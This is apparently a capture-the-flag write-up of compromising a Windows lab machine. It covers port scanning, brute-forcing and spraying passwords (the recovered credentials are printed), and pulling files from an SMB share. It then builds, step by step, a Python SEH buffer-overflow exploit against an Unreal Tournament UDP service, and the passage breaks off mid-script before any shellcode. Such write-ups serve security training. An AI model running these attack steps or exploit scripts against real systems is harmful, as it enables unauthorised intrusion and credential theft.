+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p80,135,139,445,3389,8080,49667<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.64.165.219<span class="w"> </span>-On<span class="w"> </span>target.txt<span class="w"> </span>
+
+PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
+<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
+<span class="p">|</span>_http-title:<span class="w"> </span>Tactical<span class="w"> </span>Ops<span class="w"> </span><span class="se">\x</span>E2<span class="se">\x</span><span class="m">80</span><span class="se">\x</span><span class="m">94</span><span class="w"> </span>Welcome
+<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
+
+<span class="m">135</span>/tcp<span class="w">   </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+<span class="m">139</span>/tcp<span class="w">   </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
+<span class="m">445</span>/tcp<span class="w">   </span>open<span class="w">  </span>microsoft-ds?
+
+<span class="m">3389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
+<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>PC-TO
+<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-12-18T12:33:53
+<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-06-19T12:33:53
+<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-12-27T05:48:51+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
+<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>PC-TO
+<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>PC-TO
+<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>PC-TO
+<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>PC-TO
+<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>PC-TO
+<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.19041
+<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-12-27T05:48:12+00:00
+
+<span class="m">8080</span>/tcp<span class="w">  </span>open<span class="w">  </span>http<span class="w">          </span>Unreal<span class="w"> </span>Tournament<span class="w"> </span>http<span class="w"> </span>admin<span class="w"> </span>Build<span class="w"> </span><span class="m">451</span>
+<span class="p">|</span><span class="w"> </span>http-title:<span class="w"> </span><span class="m">401</span><span class="w"> </span>Unauthorized
+<span class="p">|</span>_Requested<span class="w"> </span>resource<span class="w"> </span>was<span class="w"> </span>/ServerAdmin/
+<span class="p">|</span><span class="w"> </span>http-auth:<span class="w"> </span>
+<span class="p">|</span><span class="w"> </span>HTTP/1.1<span class="w"> </span><span class="m">401</span><span class="w"> </span>Unauthorized<span class="se">\x</span>0D
+<span class="p">|</span>_<span class="w">  </span>basic<span class="w"> </span><span class="nv">realm</span><span class="o">=</span>UT<span class="w"> </span>Remote<span class="w"> </span>Admin<span class="w"> </span>Server
+
+<span class="m">49667</span>/tcp<span class="w"> </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
+
+Host<span class="w"> </span>script<span class="w"> </span>results:
+<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span><span class="m">3</span>.1.1:<span class="w"> </span>
+<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>but<span class="w"> </span>not<span class="w"> </span>required
+<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
+<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-12-27T05:48:14
+<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A
+</code></pre></div>
+<p>The results revealed:</p>
+<ul>
+<li>Microsoft IIS 10.0</li>
+<li>SMB</li>
+<li>RDP</li>
+<li>Unreal Tournament Remote Admin Server</li>
+</ul>
+<p>The administrative interface running on port <strong>8080</strong> became the primary target during the initial enumeration.</p>
+<h2 id="web-enumeration">Web Enumeration<a class="headerlink" href="#web-enumeration" title="Permanent link">¶</a></h2>
+<p>The web application hosted on port <strong>80</strong> exposed only a static landing page.</p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-2.png" data-desc-position="bottom"><img alt="alt text" src="img/image-2.png"></a></p>
+<p>Using <strong>WhatWeb</strong>, the server was identified as Microsoft IIS 10.</p>
+<div class="highlight"><pre><span></span><code>whatweb<span class="w"> </span>http://10.64.165.219
+Summary<span class="w">   </span>:<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>Microsoft-IIS/10.0<span class="o">]</span>,<span class="w"> </span>Microsoft-IIS<span class="o">[</span><span class="m">10</span>.0<span class="o">]</span>
+</code></pre></div>
+<p>The second HTTP service running on port <strong>8080</strong> redirected users to an Unreal Tournament <strong>ServerAdmin</strong> interface protected by HTTP Basic Authentication.</p>
+<div class="highlight"><pre><span></span><code>whatweb<span class="w"> </span>http://10.64.165.219:8080
+Summary<span class="w">   </span>:<span class="w"> </span>maybe<span class="w"> </span>Dell-OpenManage-Switch-Administrator,<span class="w"> </span>HTTPServer<span class="o">[</span>UnrealEngine<span class="w"> </span>UWeb<span class="w"> </span>Web<span class="w"> </span>Server<span class="w"> </span>Build<span class="w"> </span><span class="m">451</span><span class="o">]</span>,<span class="w"> </span>RedirectLocation<span class="o">[</span>/ServerAdmin/<span class="o">]</span>
+</code></pre></div>
+<blockquote>
+<p>ServerAdmin login page</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image.png" data-desc-position="bottom"><img alt="alt text" src="img/image.png"></a></p>
+<p>Although common credentials such as <strong>admin:admin</strong> and <strong>test:test</strong> were unsuccessful, inspecting the source code of the main website revealed a reference to the username <strong>lalo</strong>.</p>
+<blockquote>
+<p>Source code showing the username</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-1.png" data-desc-position="bottom"><img alt="alt text" src="img/image-1.png"></a></p>
+<p>A password brute-force attack against this account successfully identified valid credentials.</p>
+<div class="highlight"><pre><span></span><code>hydra<span class="w"> </span>-l<span class="w"> </span>lalo<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>http-get://10.64.165.219:8080/ServerAdmin/
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>login: lalo
+password: rebelde
+</code></pre></div>
+<p>The credentials allowed access to the Unreal Tournament administrative panel.</p>
+<blockquote>
+<p>Successful authentication</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-3.png" data-desc-position="bottom"><img alt="alt text" src="img/image-3.png"></a></p>
+<h2 id="credential-discovery">Credential Discovery<a class="headerlink" href="#credential-discovery" title="Permanent link">¶</a></h2>
+<p>While reviewing the administrative interface, an additional credential was discovered.</p>
+<div class="highlight"><pre><span></span><code>AdminPassword: T4ct1c4l0ps
+</code></pre></div>
+<p>Although this password was not immediately associated with any account, it was kept for later authentication attempts.</p>
+<blockquote>
+<p>AdminPassword disclosure</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-4.png" data-desc-position="bottom"><img alt="alt text" src="img/image-4.png"></a></p>
+<h2 id="smb-enumeration">SMB Enumeration<a class="headerlink" href="#smb-enumeration" title="Permanent link">¶</a></h2>
+<p>The SMB service was initially enumerated to confirm the operating system.</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.64.165.219
+</code></pre></div>
+<p>RID brute forcing was then performed to enumerate local users.</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>...<span class="w"> </span>--rid-brute
+</code></pre></div>
+<p>The enumeration revealed multiple local accounts.</p>
+<div class="highlight"><pre><span></span><code>tanya
+boris
+hicks
+ivan
+...
+faka
+</code></pre></div>
+<blockquote>
+<p>RID enumeration</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-5.png" data-desc-position="bottom"><img alt="alt text" src="img/image-5.png"></a></p>
+<p>Since a password had previously been recovered from the web application, a password spraying attack was performed.</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>-u<span class="w"> </span>users.txt<span class="w"> </span>-p<span class="w"> </span>T4ct1c4l0ps<span class="w"> </span>--continue-on-success
+</code></pre></div>
+<p>One account successfully authenticated.</p>
+<div class="highlight"><pre><span></span><code>faka
+</code></pre></div>
+<p>The account had access to the <strong>backup</strong> SMB share.</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>...<span class="w"> </span>--shares
+
+SMB<span class="w">         </span><span class="m">10</span>.64.165.219<span class="w">   </span><span class="m">445</span><span class="w">    </span>PC-TO<span class="w">            </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
+SMB<span class="w">         </span><span class="m">10</span>.64.165.219<span class="w">   </span><span class="m">445</span><span class="w">    </span>PC-TO<span class="w">            </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
+SMB<span class="w">         </span><span class="m">10</span>.64.165.219<span class="w">   </span><span class="m">445</span><span class="w">    </span>PC-TO<span class="w">            </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
+SMB<span class="w">         </span><span class="m">10</span>.64.165.219<span class="w">   </span><span class="m">445</span><span class="w">    </span>PC-TO<span class="w">            </span>backup<span class="w">          </span>READ<span class="w">            </span>
+SMB<span class="w">         </span><span class="m">10</span>.64.165.219<span class="w">   </span><span class="m">445</span><span class="w">    </span>PC-TO<span class="w">            </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
+SMB<span class="w">         </span><span class="m">10</span>.64.165.219<span class="w">   </span><span class="m">445</span><span class="w">    </span>PC-TO<span class="w">            </span>important<span class="w">                       </span>
+SMB<span class="w">         </span><span class="m">10</span>.64.165.219<span class="w">   </span><span class="m">445</span><span class="w">    </span>PC-TO<span class="w">            </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
+</code></pre></div>
+<p>Using smbclient, the share contents were downloaded.</p>
+<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>//10.64.165.219/backup<span class="w"> </span>-U<span class="w"> </span>faka
+
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>dir
+<span class="w">  </span>TacticalOps.zip<span class="w">                     </span>A<span class="w"> </span><span class="m">387948852</span><span class="w">  </span>Thu<span class="w"> </span>Dec<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">19</span>:33:39<span class="w"> </span><span class="m">2025</span>
+</code></pre></div>
+<p>The archive <strong>TacticalOps.zip</strong> contained the vulnerable executable required for the next stage of the attack.</p>
+<h2 id="buffer-overflow">Buffer Overflow<a class="headerlink" href="#buffer-overflow" title="Permanent link">¶</a></h2>
+<p>After extracting the contents of <strong>TacticalOps.zip</strong>, the archive contained the vulnerable executable required to continue the attack.</p>
+<blockquote>
+<p>Extracted files</p>
+</blockquote>
+<p>To analyze the vulnerability, the executable was executed inside a dedicated Windows 7 virtual machine configured with <strong>Immunity Debugger</strong> and the <strong>Mona</strong> plugin.</p>
+<p>The application exposes a UDP service that responds to Unreal Tournament query packets.</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-u<span class="w"> </span><span class="m">192</span>.168.159.134<span class="w"> </span><span class="m">7778</span>
+<span class="se">\b</span>asic<span class="se">\</span>
+<span class="se">\\</span>gamename<span class="se">\\</span>ut<span class="se">\\</span>gamever<span class="se">\\</span><span class="m">451</span><span class="se">\\</span>minnetver<span class="se">\\</span><span class="m">432</span><span class="se">\\</span>location<span class="se">\\</span><span class="m">0</span><span class="se">\\</span>queryid<span class="se">\\</span><span class="m">1</span>.1<span class="se">\\</span>final<span class="se">\\</span>
+</code></pre></div>
+<blockquote>
+<p>UDP response</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-6.png" data-desc-position="bottom"><img alt="alt text" src="img/image-6.png"></a></p>
+<p>Sending an oversized payload causes the application to crash, confirming the presence of a classic stack-based buffer overflow.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'192.168.159.134'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">7778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<blockquote>
+<p>Initial crash in Immunity Debugger</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-7.png" data-desc-position="bottom"><img alt="alt text" src="img/image-7.png"></a></p>
+<h3 id="determining-the-seh-offset">Determining the SEH Offset<a class="headerlink" href="#determining-the-seh-offset" title="Permanent link">¶</a></h3>
+<p>To determine the exact location where the Structured Exception Handler (SEH) is overwritten, a cyclic pattern was generated using the Metasploit Framework.</p>
+<div class="highlight"><pre><span></span><code>msf-pattern_create<span class="w"> </span>-l<span class="w"> </span><span class="m">1000</span>
+</code></pre></div>
+<p>The generated pattern replaced the previous payload and was sent to the application.</p>
+<blockquote>
+<p>Crash using cyclic pattern</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-13.png" data-desc-position="bottom"><img alt="alt text" src="img/image-13.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-12.png" data-desc-position="bottom"><img alt="alt text" src="img/image-12.png"></a></p>
+<p>After the exception was triggered, the values stored in the SEH records were recovered from Immunity Debugger.</p>
+<div class="highlight"><pre><span></span><code>33634132
+63413163
+</code></pre></div>
+<p>These values were used with <code>msf-pattern_offset</code> to determine the exact overwrite position.</p>
+<div class="highlight"><pre><span></span><code>msf-pattern_offset<span class="w"> </span>-l<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-q<span class="w"> </span><span class="m">63413163</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>[*] Exact match at offset 64
+</code></pre></div>
+<p>The SEH overwrite begins after <strong>64 bytes</strong>, which became the offset used throughout the remainder of the exploit.</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'192.168.159.134'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">7778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'B'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'C'</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'Z'</span> <span class="o">*</span> <span class="mi">928</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<blockquote>
+<p>Offset calculation</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-14.png" data-desc-position="bottom"><img alt="alt text" src="img/image-14.png"></a></p>
+<h3 id="finding-a-poppopret-sequence">Finding a POP/POP/RET Sequence<a class="headerlink" href="#finding-a-poppopret-sequence" title="Permanent link">¶</a></h3>
+<p>Since this vulnerability is exploited through Structured Exception Handling (SEH), the next step is to locate a suitable <code>POP/POP/RET</code> instruction sequence inside a module without exploit mitigations enabled.</p>
+<p>The loaded modules were enumerated using Mona.</p>
+<div class="highlight"><pre><span></span><code>!mona<span class="w"> </span>modules
+</code></pre></div>
+<blockquote>
+<p>Mona modules</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-10.png" data-desc-position="bottom"><img alt="alt text" src="img/image-10.png"></a></p>
+<p>The module <code>core.dll</code> was selected because it does not enable protections such as ASLR or SafeSEH.</p>
+<p>Next, Mona was used to search for valid exception handler sequences.</p>
+<div class="highlight"><pre><span></span><code>!mona<span class="w"> </span>seh<span class="w"> </span>-m<span class="w"> </span>core.dll
+</code></pre></div>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-9.png" data-desc-position="bottom"><img alt="alt text" src="img/image-9.png"></a></p>
+<p>Among the available candidates, the address below was selected.</p>
+<div class="highlight"><pre><span></span><code>0x10107716
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'192.168.159.134'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">7778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">nSEH</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'B'</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="n">SEH</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">'&lt;L'</span><span class="p">,</span> <span class="mh">0x10107716</span><span class="p">)</span>
+<span class="n">fill</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'D'</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="n">offset</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nSEH</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">SEH</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">secure</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span>
+    <span class="sa">b</span><span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span>
+    <span class="n">nSEH</span> <span class="o">+</span>
+    <span class="n">SEH</span> <span class="o">+</span>
+    <span class="n">fill</span>
+<span class="p">)</span>
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">data</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recvfrom</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"Respuesta:"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"[+] Enviando payload..."</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+
+<span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">timeout</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"No hubo respuesta"</span><span class="p">)</span>
+
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
+<p>This address was later used as the SEH overwrite value.</p>
+<blockquote>
+<p>POP/POP/RET result</p>
+</blockquote>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-15.png" data-desc-position="bottom"><img alt="alt text" src="img/image-15.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-16.png" data-desc-position="bottom"><img alt="alt text" src="img/image-16.png"></a></p>
+<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="img/image-17.png" data-desc-position="bottom"><img alt="alt text" src="img/image-17.png"></a></p>
+<h3 id="redirecting-execution">Redirecting Execution<a class="headerlink" href="#redirecting-execution" title="Permanent link">¶</a></h3>
+<p>Only four bytes are available in the nSEH field, making a short jump the preferred technique for redirecting execution to the controlled buffer.</p>
+<p>The required opcode was obtained using the Metasploit NASM shell.</p>
+<div class="highlight"><pre><span></span><code>msf-nasm_shell
+nasm<span class="w"> </span>&gt;<span class="w"> </span>jmp<span class="w"> </span>short<span class="w"> </span><span class="m">8</span>
+<span class="m">00000000</span><span class="w">  </span>EB06<span class="w">              </span>jmp<span class="w"> </span>0x8
+</code></pre></div>
+<p>The resulting instruction was placed in the nSEH field.</p>
+<div class="highlight"><pre><span></span><code>EB 08 90 90
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s1">'192.168.159.134'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">7778</span>
+
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\\</span><span class="s1">basic</span><span class="se">\\</span><span class="s1">'</span>
+
+<span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
+<span class="n">offset</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="c1"># JMP SHORT +0x8 NOPNOP to fill the 4 bytes of nSEH</span>
+<span class="n">nSEH</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\xeb\x08\x90\x90</span><span class="s1">'</span>
